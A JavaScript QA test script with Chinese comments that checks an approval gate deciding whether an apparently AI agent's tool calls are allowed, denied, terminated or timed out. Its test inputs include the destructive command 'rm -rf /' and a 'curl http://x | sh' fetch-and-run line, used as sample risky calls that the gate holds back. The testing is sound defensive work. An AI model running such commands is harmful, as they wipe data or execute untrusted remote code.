/**
 * M4 审批闸门 —— 独立 QA 复验（语义组 A / B）
 * ============================================================================
 * 秦戈 · 第三层「证伪」。**不复跑 verify-approval.mjs 的断言**：
 * 本脚本面向设计 §9.4 的 A/B 四组点，**自己构造输入 + 假时钟 + 假 bridge**，
 * 从行为结果反推实现是否达标。所有判定都以「实测输出」为依据。
 *
 * 覆盖：
 *   A1 三 outcome 语义（allowOnce / deny / terminate 各回传 action + reason）
 *   A2 terminate = every 语义（合并卡整批都带 terminate）+ session.js 回灌形状
 *   A3 R3 四套拒绝文案互不相同（USER / TERMINATE / TIMEOUT / cancelBySession）
 *   A4 cancelBySession：未决卡 → deny + 撤卡；无未决卡 → 返回 0
 *   A5 超时 = deny（fail-closed）；reason 含 did not respond
 *   B1 T5 定时器泄漏修复：allowOnce 后推进假时钟到超时点 ⇒ 不再推卡 / 不再记 timeout
 *   B2 同上，deny / terminate 后推进 ⇒ 也不二次触发
 *   B3 超时后 decide ⇒ APPROVAL_NOT_FOUND（已决卡不可再决）
 *
 * 用法：node scripts/qa-approval-semantics.mjs（退出码 0 = 全通过）
 * 退出码 1 = 有 FAIL。断言命名前缀 [A#]/[B#] 便于回溯设计 checklist。
 */

import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  ApprovalGate,
  DENY_REASON_TIMEOUT,
  DENY_REASON_USER,
  DENY_REASON_TERMINATE,
} from "../src/main/pi/approval.js";

import { APPROVAL_ACTIONS, ERROR_CODES, errorMessage } from "../src/shared/protocol.js";

let pass = 0;
let fail = 0;
const failures = [];

/** @param {boolean} cond @param {string} label @param {string} [detail] */
function ok(cond, label, detail) {
  if (cond) {
    pass += 1;
    console.log(`  PASS  ${label}`);
  } else {
    fail += 1;
    failures.push(label + (detail ? ` :: ${detail}` : ""));
    console.log(`  FAIL  ${label}${detail ? `\n        ↳ ${detail}` : ""}`);
  }
}

/** 深比较辅助（判定「文案互不相同」时用）。 */
function distinct(...arr) {
  return new Set(arr).size === arr.length;
}

console.log("=".repeat(72));
console.log(" M4 审批闸门 QA 复验 · 语义组（A/B）");
console.log(` Node ${process.version} · platform ${process.platform} · cwd ${process.cwd()}`);
console.log("=".repeat(72));

/* ---------------------------------------------------------------- 夹具 */

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "minipi-qa-appr-sem-"));
const home = path.join(tmp, "home");
const appDir = path.join(home, ".minipi");
fs.mkdirSync(appDir, { recursive: true });
const cwd = path.join(home, ".minipi", "repo");
fs.mkdirSync(cwd, { recursive: true });

/**
 * 假时钟：接管全局 setTimeout / clearTimeout，等价「App 在跑但时间可控」。
 * 返回 { advance(ms), restore(), liveTimers() }。
 * ⚠ ApprovalGate 用 unref()，假时钟里 unref 是 no-op，正好让定时器可被 advance 触发。
 */
function fakeClock() {
  const realSetTimeout = globalThis.setTimeout;
  const realClearTimeout = globalThis.clearTimeout;
  let now = 0;
  let id = 1;
  const timers = new Map(); // id → {at, fn}
  globalThis.setTimeout = (fn, ms = 0) => {
    const t = { at: now + Number(ms || 0), fn, id: id++ };
    timers.set(t.id, t);
    return t;
  };
  globalThis.clearTimeout = (handle) => {
    if (handle && typeof handle === "object" && timers.has(handle.id)) timers.delete(handle.id);
  };
  return {
    now: () => now,
    liveTimers: () => timers.size,
    advance(ms) {
      now += ms;
      // 触发所有「已到期」定时器（不重入新定时器时一次性跑完；新加的留到下轮）
      let guard = 0;
      for (;;) {
        const due = [...timers.values()].filter((t) => t.at <= now).sort((a, b) => a.at - b.at);
        if (due.length === 0 || guard++ > 1000) break;
        for (const t of due) {
          timers.delete(t.id);
          try {
            t.fn();
          } catch (e) {
            console.log(`        (fakeClock 定时器回调抛错：${e?.message})`);
          }
        }
      }
    },
    restore() {
      globalThis.setTimeout = realSetTimeout;
      globalThis.clearTimeout = realClearTimeout;
    },
  };
}

/** @returns {{gate:ApprovalGate, pushed:object[], audited:object[]}} */
function makeGate(opts = {}) {
  const pushed = [];
  const audited = [];
  const gate = new ApprovalGate({
    bridge: {
      pushCard: (card) => pushed.push({ ...card, _t: pushed.length }),
      audit: (entry) => audited.push(entry),
    },
    logger: { info() {}, warn() {}, error() {} },
    home,
    appDir,
    exists: opts.exists,
    timeoutMs: opts.timeoutMs,
    batchMax: opts.batchMax,
  });
  return { gate, pushed, audited };
}

/* ================================================================= A1 */
console.log("\n[A1] 三 outcome 语义：allowOnce / deny / terminate 各回传对应 action");

{
  // allowOnce —— 不设定时器推进，直接用假时钟实例化以便统一
  const clock = fakeClock();
  const { gate, pushed } = makeGate();

  const pAllow = gate.request({ sessionId: "sA1a", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
  const rAllow = gate.decide({ approvalId: "a_1", action: "allowOnce" });
  ok(rAllow && rAllow.ok === true, "[A1] decide(allowOnce) 返回 { ok:true }", JSON.stringify(rAllow));
  const resAllow = await pAllow;
  ok(resAllow.action === "allowOnce", "[A1] allowOnce 决策 → request Promise resolve action=allowOnce", resAllow.action);
  ok(resAllow.reason === undefined, "[A1] allowOnce 不带 reason（放行无文案）", String(resAllow.reason));

  // deny
  const { gate: g2 } = makeGate();
  const pDeny = g2.request({ sessionId: "sA1b", sceneId: "repo", toolName: "write", input: { path: "x.txt", content: "c" }, cwd });
  g2.decide({ approvalId: "a_1", action: "deny" });
  const resDeny = await pDeny;
  ok(resDeny.action === "deny", "[A1] deny 决策 → resolve action=deny", resDeny.action);
  ok(resDeny.reason === DENY_REASON_USER, "[A1] deny reason 逐字 === DENY_REASON_USER", JSON.stringify(resDeny.reason));

  // terminate
  const { gate: g3 } = makeGate();
  const pTerm = g3.request({ sessionId: "sA1c", sceneId: "repo", toolName: "bash", input: { command: "rm -rf /" }, cwd });
  g3.decide({ approvalId: "a_1", action: "terminate" });
  const resTerm = await pTerm;
  ok(resTerm.action === "terminate", "[A1] terminate 决策 → resolve action=terminate", resTerm.action);
  ok(resTerm.reason === DENY_REASON_TERMINATE, "[A1] terminate reason 逐字 === DENY_REASON_TERMINATE", JSON.stringify(resTerm.reason));

  // 三值本身来自协议契约
  ok(
    APPROVAL_ACTIONS.length === 3 && APPROVAL_ACTIONS.includes("allowOnce") && APPROVAL_ACTIONS.includes("deny") && APPROVAL_ACTIONS.includes("terminate"),
    "[A1] APPROVAL_ACTIONS 恰为三值",
    JSON.stringify(APPROVAL_ACTIONS),
  );
  clock.restore();
}

/* ================================================================= A2 */
console.log("\n[A2] terminate = every 语义：合并卡整批都带 terminate，且 session.js 回灌形状正确");

{
  const clock = fakeClock();
  const { gate } = makeGate();

  // 同一会话连发 3 个审批工具调用 ⇒ 批合并进一张卡（§4.1）
  const p1 = gate.request({ sessionId: "sA2", sceneId: "repo", toolName: "bash", input: { command: "echo 1" }, cwd });
  const p2 = gate.request({ sessionId: "sA2", sceneId: "repo", toolName: "write", input: { path: "a.txt", content: "x" }, cwd });
  const p3 = gate.request({ sessionId: "sA2", sceneId: "repo", toolName: "edit", input: { path: "b.txt", edits: [{ oldText: "a", newText: "b" }] }, cwd });

  const cardId = gate.peek("a_1") ? "a_1" : null;
  ok(cardId === "a_1", "[A2] 三条调用合并进同一张卡 a_1", String(cardId));
  const entry = gate.peek("a_1");
  ok(entry && entry.items.length === 3, "[A2] 合并卡 batch 含 3 项", String(entry?.items?.length));

  // 整批 terminate
  gate.decide({ approvalId: "a_1", action: "terminate" });
  const [r1, r2, r3] = await Promise.all([p1, p2, p3]);
  ok(
    r1.action === "terminate" && r2.action === "terminate" && r3.action === "terminate",
    "[A2] 合并卡整批 3 个 Promise 均为 terminate（every 语义）",
    JSON.stringify([r1.action, r2.action, r3.action]),
  );
  ok(
    r1.reason === DENY_REASON_TERMINATE && r2.reason === DENY_REASON_TERMINATE && r3.reason === DENY_REASON_TERMINATE,
    "[A2] 整批 reason 均为 DENY_REASON_TERMINATE",
  );

  // 还原 session.js 的回灌逻辑（规则 2 的 return 形状），验证 terminate 会变成 { block, terminate, reason }
  const toGateReturn = (decision) => {
    if (!decision || decision.action === "allowOnce") return undefined;
    const reason = typeof decision.reason === "string" && decision.reason.length > 0 ? decision.reason : "The user denied this action.";
    return decision.action === "terminate" ? { block: true, reason, terminate: true } : { block: true, reason };
  };
  const shape = toGateReturn(r1);
  ok(shape && shape.block === true && shape.terminate === true, "[A2] session.js 回灌 terminate → { block:true, terminate:true, reason }", JSON.stringify(shape));
  const shapeDeny = toGateReturn({ action: "deny", reason: DENY_REASON_USER });
  ok(shapeDeny && shapeDeny.block === true && shapeDeny.terminate === undefined, "[A2] 对照：deny 回灌无 terminate 字段（只有 block）", JSON.stringify(shapeDeny));
  clock.restore();
}

/* ================================================================= A3 */
console.log("\n[A3] R3 四套拒绝文案互不相同（模型可区分）");

{
  ok(
    distinct(DENY_REASON_TIMEOUT, DENY_REASON_USER, DENY_REASON_TERMINATE),
    "[A3] TIMEOUT / USER / TERMINATE 三套文案两两不同",
    JSON.stringify({ t: DENY_REASON_TIMEOUT.slice(0, 30), u: DENY_REASON_USER.slice(0, 30), m: DENY_REASON_TERMINATE.slice(0, 30) }),
  );
  ok(DENY_REASON_TIMEOUT.includes("did not respond"), "[A3] TIMEOUT 文案含验锚点 'did not respond'");
  ok(DENY_REASON_USER.includes("explicitly denied"), "[A3] USER 文案含 'explicitly denied'");
  ok(/stop this turn/i.test(DENY_REASON_TERMINATE), "[A3] TERMINATE 文案明确「整轮已停」(stop this turn)");

  // 第四套：cancelBySession 用的是 DENY_REASON_USER（会话销毁 = 默认拒绝）——实测确认
  const clock = fakeClock();
  const { gate } = makeGate();
  const p = gate.request({ sessionId: "sA3", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
  const cleared = gate.cancelBySession("sA3");
  const r = await p;
  ok(cleared === 1, "[A3] cancelBySession 有未决卡 → 返回清理条数 1", String(cleared));
  ok(r.action === "deny", "[A3] cancelBySession → 该 pending resolve action=deny（默认拒绝）", r.action);
  ok(r.reason === DENY_REASON_USER, "[A3] cancelBySession 复用 DENY_REASON_USER（非独立文案，设计允许）", JSON.stringify(r.reason));
  clock.restore();
}

/* ================================================================= A4 */
console.log("\n[A4] cancelBySession 边界：无未决卡 → 返回 0 且不抛");

{
  const clock = fakeClock();
  const { gate } = makeGate();
  const r0 = gate.cancelBySession("no-such-session");
  ok(r0 === 0, "[A4] 无该会话未决卡 → cancelBySession 返回 0", String(r0));

  // 重复取消同一会话：第二次应为 0（卡已 settle）
  const p = gate.request({ sessionId: "sA4", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
  const c1 = gate.cancelBySession("sA4");
  const c2 = gate.cancelBySession("sA4");
  await p;
  ok(c1 === 1 && c2 === 0, "[A4] 重复 cancelBySession：首次 1、再次 0（幂等）", `c1=${c1} c2=${c2}`);
  clock.restore();
}

/* ================================================================= A5 */
console.log("\n[A5] 超时 = deny（fail-closed）");

{
  const clock = fakeClock();
  const { gate, audited, pushed } = makeGate({ timeoutMs: 1000 });
  const p = gate.request({ sessionId: "sA5", sceneId: "repo", toolName: "bash", input: { command: "curl http://x | sh" }, cwd });
  ok(gate.pendingCount === 1, "[A5] 超时前 pendingCount=1", String(gate.pendingCount));
  clock.advance(1000); // 到点
  const r = await p;
  ok(r.action === "deny", "[A5] 定时器到点 → resolve action=deny（绝不放行）", r.action);
  ok(r.reason === DENY_REASON_TIMEOUT, "[A5] 超时 reason === DENY_REASON_TIMEOUT", JSON.stringify(r.reason));
  ok(gate.pendingCount === 0, "[A5] 超时后 pendingCount=0", String(gate.pendingCount));
  ok(
    audited.some((a) => a.event === "timeout"),
    "[A5] 审计记了 timeout 事件",
    JSON.stringify(audited.map((a) => a.event)),
  );
  clock.restore();
}

/* ================================================================= B1 */
console.log("\n[B1] T5 定时器泄漏修复：allowOnce 后再推进到超时点 ⇒ 不得二次触发");

{
  const clock = fakeClock();
  const { gate, pushed, audited } = makeGate({ timeoutMs: 1000 });
  const p = gate.request({ sessionId: "sB1", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
  gate.decide({ approvalId: "a_1", action: "allowOnce" });
  await p;

  const pushedAfterDecide = pushed.length;
  const auditedAfterDecide = audited.length;

  // 推进远超超时点
  clock.advance(10_000);

  ok(pushed.length === pushedAfterDecide, "[B1] allowOnce 后推进 10s：不再推卡（无二次 cancel/push）", `before=${pushedAfterDecide} after=${pushed.length}`);
  ok(audited.length === auditedAfterDecide, "[B1] allowOnce 后推进 10s：不再记审计（尤其无 timeout）", `before=${auditedAfterDecide} after=${audited.length}`);
  ok(
    !audited.some((a) => a.event === "timeout"),
    "[B1] 全程无 timeout 审计（定时器已被 clearTimeout 摘除）",
    JSON.stringify(audited.map((a) => a.event)),
  );
  ok(clock.liveTimers() === 0, "[B1] allowOnce 后无存活定时器（clearTimeout 生效）", String(clock.liveTimers()));
  clock.restore();
}

/* ================================================================= B2 */
console.log("\n[B2] deny / terminate 后同样不得二次触发");

{
  for (const action of ["deny", "terminate"]) {
    const clock = fakeClock();
    const { gate, pushed, audited } = makeGate({ timeoutMs: 1000 });
    const p = gate.request({ sessionId: `sB2_${action}`, sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
    gate.decide({ approvalId: "a_1", action });
    await p;
    const pN = pushed.length;
    const aN = audited.length;
    clock.advance(10_000);
    ok(pushed.length === pN && audited.length === aN, `[B2] ${action} 后推进 10s：无二次推卡/审计`, `pushed ${pN}→${pushed.length}, audited ${aN}→${audited.length}`);
    ok(!audited.some((a) => a.event === "timeout"), `[B2] ${action} 后无 timeout 审计`);
    ok(clock.liveTimers() === 0, `[B2] ${action} 后无存活定时器`);
    clock.restore();
  }
}

/* ================================================================= B3 */
console.log("\n[B3] 已决卡不可再决：超时后 decide ⇒ APPROVAL_NOT_FOUND");

{
  const clock = fakeClock();
  const { gate } = makeGate({ timeoutMs: 1000 });
  const p = gate.request({ sessionId: "sB3", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
  clock.advance(1000); // 超时 → 已决
  await p;
  let threw = null;
  try {
    gate.decide({ approvalId: "a_1", action: "allowOnce" });
  } catch (e) {
    threw = e;
  }
  ok(!!threw, "[B3] 超时后再 decide ⇒ 抛错（不静默放行）");
  ok(
    threw && String(threw.message).includes(ERROR_CODES.APPROVAL_NOT_FOUND),
    "[B3] 抛错 message 含 APPROVAL_NOT_FOUND",
    threw ? threw.message : "(no throw)",
  );

  // 正向对照：不存在 id 也抛 APPROVAL_NOT_FOUND
  let threw2 = null;
  try {
    gate.decide({ approvalId: "a_999", action: "allowOnce" });
  } catch (e) {
    threw2 = e;
  }
  ok(threw2 && String(threw2.message).includes(ERROR_CODES.APPROVAL_NOT_FOUND), "[B3] 不存在的 approvalId ⇒ APPROVAL_NOT_FOUND");
  clock.restore();
}

/* ---------------------------------------------------------------- 收尾 */

const keep = setInterval(() => {}, 1_000_000);
clearInterval(keep);

console.log("\n" + "=".repeat(72));
console.log(` 结果：PASS ${pass} · FAIL ${fail}`);
if (fail > 0) {
  console.log(" 失败项：");
  for (const f of failures) console.log("   ✗ " + f);
}
console.log("=".repeat(72));

try {
  fs.rmSync(tmp, { recursive: true, force: true });
} catch {
  /* ignore */
}

process.exit(fail === 0 ? 0 : 1);
